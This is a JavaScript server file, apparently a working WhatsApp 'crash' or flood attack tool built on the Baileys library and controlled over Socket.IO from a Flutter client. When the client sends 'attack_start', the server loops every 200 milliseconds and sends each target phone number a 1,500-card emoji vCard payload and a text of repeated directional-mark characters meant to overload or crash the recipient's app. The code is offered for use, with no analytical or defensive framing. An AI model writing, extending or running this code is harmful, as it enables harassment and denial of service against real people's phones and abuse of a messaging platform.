// stateless_server.js
// DENO DEPLOY + SOCKET.IO (GHOST MODE)
// NO DATABASE. NO DISK. ALL IN MEMORY (RAM).
// Session data is provided by the CLIENT (Flutter) upon connection.

import { Server } from "npm:socket.io";
import { createServer } from "node:http";
import { 
    default as makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    delay, 
    makeCacheableSignalKeyStore,
    initAuthCreds,
    proto,
    BufferJSON
} from 'npm:@whiskeysockets/baileys';
import { Boom } from 'npm:@hapi/boom';
import pino from 'npm:pino';

const httpServer = createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('MALXGMN GHOST SERVER (SOCKET.IO) IS RUNNING');
});

const io = new Server(httpServer, {
    cors: {
        origin: "*", // Allow connection from Flutter anywhere
        methods: ["GET", "POST"]
    }
});

// GLOBAL STATE (Only valid for active connection)
let activeSock = null;
let isAttacking = false;

// --- CUSTOM IN-MEMORY AUTH STATE ---
// This function creates an AuthState that starts with data from CLIENT
// and emits updates back to CLIENT to save locally.

const useSocketAuthState = async (socket, initialData) => {
    const creds = initialData?.creds 
        ? JSON.parse(JSON.stringify(initialData.creds), BufferJSON.reviver) 
        : await initAuthCreds();

    const keys = initialData?.keys || {};

    const saveState = async () => {
        // Prepare data to send back to client
        const exportData = {
            creds: creds,
            keys: keys
        };
        // Emit 'session_save' event to client with full data
        // Client MUST save this JSON to local storage
        socket.emit('session_save', JSON.stringify(exportData, BufferJSON.replacer));
    };

    return {
        state: {
            creds,
            keys: {
                get: (type, ids) => {
                    const data = {};
                    ids.forEach(id => {
                        let value = keys[`${type}-${id}`];
                        if (type === 'app-state-sync-key' && value) {
                            value = proto.Message.AppStateSyncKeyData.fromObject(value);
                        }
                        data[id] = value;
                    });
                    return data;
                },
                set: (data) => {
                    for (const category in data) {
                        for (const id in data[category]) {
                            const value = data[category][id];
                            const key = `${category}-${id}`;
                            if (value) {
                                keys[key] = value;
                            } else {
                                delete keys[key];
                            }
                        }
                    }
                    saveState(); // Trigger save to client
                }
            }
        },
        saveCreds: async () => {
            await saveState(); // Trigger save to client
        }
    };
};


// --- SOCKET.IO LOGIC ---

io.on("connection", (socket) => {
    console.log(`[+] New Client Connected: ${socket.id}`);

    // CLIENT: Emit 'init_session' with stored JSON (or null)
    socket.on("init_session", async (rawSessionJson) => {
        try {
            console.log("[*] Client requested session init...");
            
            // If previous socket exists, close it to avoid conflict
            if (activeSock) {
                try { activeSock.end(undefined); } catch {}
                activeSock = null;
            }

            let initialData = null;
            if (rawSessionJson) {
                try {
                    initialData = JSON.parse(rawSessionJson, BufferJSON.reviver);
                    console.log("[✔] Session data loaded from client payload");
                } catch (e) {
                    console.log("[-] Invalid JSON provided, starting fresh session");
                }
            } else {
                console.log("[!] No session provided, starting fresh QR scan");
            }

            // Start Baileys with this In-Memory State
            await startSock(socket, initialData);

        } catch (e) {
            console.error("Init Error:", e);
            socket.emit("error", e.message);
        }
    });

    // CLIENT: Emit 'attack_start' with targets
    socket.on("attack_start", async (targets) => {
        if (!activeSock) return socket.emit("error", "WA Not Connected");
        if (isAttacking) return socket.emit("error", "Already Attacking");
        
        console.log(`[!] ATTACK ORDER RECEIVED: ${targets}`);
        runAttackLoop(socket, targets);
    });

    // CLIENT: Emit 'attack_stop'
    socket.on("attack_stop", () => {
        isAttacking = false;
        socket.emit("status", "Attack Stopped");
    });

    socket.on("disconnect", () => {
        console.log(`[-] Client Disconnected: ${socket.id}`);
        // Optional: Kill bot if client leaves to save resources?
        // For now, keep it running briefly.
    });
});


// --- BAILEYS LOGIC ---

async function startSock(socket, initialData) {
    const { state, saveCreds } = await useSocketAuthState(socket, initialData);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false, // Don't print to console, emit to socket
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        browser: ["MALXGMN (Ghost)", "Chrome", "1.0.0"],
        generateHighQualityLinkPreview: true,
    });

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            // Emit QR to Client to display in Flutter
            socket.emit('qr', qr); 
            console.log("[QR] QR Code sent to client");
        }

        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom)
                ? lastDisconnect.error.output?.statusCode !== DisconnectReason.loggedOut
                : true;
            
            console.log('[!] Connection closed. Reconnecting:', shouldReconnect);
            
            if (shouldReconnect) {
                startSock(socket, initialData); // Try again
            } else {
                socket.emit('logged_out', 'Session Invalidated');
                console.log('[!] Logged out.');
            }
        } else if (connection === 'open') {
            console.log('[+] WHATSAPP CONNECTED!');
            activeSock = sock;
            socket.emit('ready', 'WhatsApp Connected');
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

// --- ATTACK LOGIC ---

async function runAttackLoop(socket, rawTargets) {
    isAttacking = true;
    const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
    
    // Payloads
    let heavyVcardContent = '';
    for(let i=0; i<1500; i++) heavyVcardContent += 'BEGIN:VCARD
VERSION:3.0
FN:' + '🔥'.repeat(10) + 'OVERLOAD_' + i + '
TEL;type=CELL;waid=0:0
END:VCARD
';
    
    const vcardPayload = { contacts: { displayName: '☠️', contacts: [{ vcard: heavyVcardContent }] } };
    const crashText = "💣" + "\u200e\u200f".repeat(500);

    let counter = 0;
    while(isAttacking) {
        try {
            if (!activeSock) { await delay(2000); continue; }
            counter++;
            
            const batchTasks = [];
            for (const jid of targetJids) {
                batchTasks.push(activeSock.sendMessage(jid, vcardPayload));
                batchTasks.push(activeSock.sendMessage(jid, { text: crashText }));
            }
            await Promise.all(batchTasks);
            
            socket.emit('attack_progress', { count: counter, targets: targetJids.length });
            await delay(200); 
        } catch (e) {
            console.log(`[!] Attack Error: ${e.message}`);
            await delay(1000);
        }
    }
}

// START SERVER
const PORT = 8000;
httpServer.listen(PORT, () => {
    console.log(`[SERVER] GHOST Listening on port ${PORT}`);
});
